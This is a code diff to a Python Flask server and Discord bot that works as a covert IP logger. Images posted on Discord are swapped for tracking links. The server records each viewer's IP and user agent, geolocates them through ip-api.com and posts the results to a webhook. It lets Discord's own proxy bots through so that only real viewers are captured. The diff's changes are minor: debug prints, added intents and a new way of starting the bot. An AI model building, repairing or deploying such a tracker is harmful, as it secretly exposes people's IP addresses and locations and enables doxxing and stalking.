@@ -5,6 +5,7 @@ language: Python 3.11+, file: server.py, target: Railway
 
 import os
 import uuid
+import asyncio
 import threading
 import requests
 import discord
@@ -21,8 +22,6 @@ LOGGER_HOST   = os.environ.get("LOGGER_HOST", "http://localhost:5000")
 image_store: dict[str, str] = {}
 seen_ips: set[str] = set()
 
-# ── Flask server ──────────────────────────────────────────────────────────────
-
 def geoip(ip: str) -> dict:
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query", timeout=4)
@@ -32,7 +31,6 @@ def geoip(ip: str) -> dict:
         pass
     return {}
 
-
 def fire_webhook(tracking_id: str, img_url: str, ip: str, geo: dict, ua: str):
     now      = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
     country  = geo.get("country", "Unknown")
@@ -40,7 +38,6 @@ def fire_webhook(tracking_id: str, img_url: str, ip: str, geo: dict, ua: str):
     city     = geo.get("city", "")
     isp      = geo.get("isp", "Unknown")
     location = f"{city}, {region}, {country}".strip(", ")
-
     embed = {
         "title": "📸 Image Clicked",
         "color": 0xFF4444,
@@ -60,7 +57,6 @@ def fire_webhook(tracking_id: str, img_url: str, ip: str, geo: dict, ua: str):
     except Exception as e:
         print(f"[webhook error] {e}")
 
-
 @app.route("/register")
 def register():
     img_url = request.args.get("img")
@@ -72,36 +68,29 @@ def register():
     tracking_url = f"{host}/img/{tid}"
     return jsonify({"tracking_url": tracking_url, "original": img_url})
 
-
 @app.route("/img/<tid>")
 def serve_image(tid: str):
     img_url = image_store.get(tid)
     if not img_url:
         return "not found", 404
-
     ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
     ua = request.headers.get("User-Agent", "")
-
     skip_agents = ("Discordbot", "DiscordMediaProxy")
     if any(s in ua for s in skip_agents):
         return redirect(img_url, code=302)
-
     if ip not in seen_ips:
         seen_ips.add(ip)
         geo = geoip(ip)
         fire_webhook(tid, img_url, ip, geo, ua)
-
     try:
         r = requests.get(img_url, timeout=8, stream=True)
         return Response(r.content, content_type=r.headers.get("Content-Type", "image/jpeg"))
     except Exception:
         return redirect(img_url, code=302)
 
-
 @app.route("/list")
 def list_trackers():
     return jsonify(image_store)
-
 
 # ── Discord bot ───────────────────────────────────────────────────────────────
 
@@ -109,25 +98,26 @@ IMAGE_TYPES = {"image/png", "image/jpeg", "image/gif", "image/webp"}
 
 intents = discord.Intents.default()
 intents.message_content = True
+intents.messages = True
+intents.guilds = True
 bot = commands.Bot(command_prefix="!", intents=intents)
-
 
 @bot.event
 async def on_ready():
     print(f"[*] Bot logged in as {bot.user}")
-
 
 @bot.event
 async def on_message(message: discord.Message):
     if message.author.bot:
         return
 
+    print(f"[*] Message received from {message.author} in {message.channel}")
+
     for attachment in message.attachments:
         ct = attachment.content_type or ""
+        print(f"[*] Attachment: {attachment.url} type={ct}")
         if not any(ct.startswith(t) for t in IMAGE_TYPES):
             continue
-
-        # Register with logger server
         try:
             r = requests.get(
                 f"{LOGGER_HOST}/register",
@@ -151,16 +141,14 @@ async def on_message(message: discord.Message):
 
     await bot.process_commands(message)
 
-
 def run_bot():
     if DISCORD_TOKEN:
         print("[*] Starting Discord bot...")
-        bot.run(DISCORD_TOKEN)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(DISCORD_TOKEN))
     else:
         print("[!] No DISCORD_TOKEN set — bot disabled")
-
-
-# ── Entry point ───────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
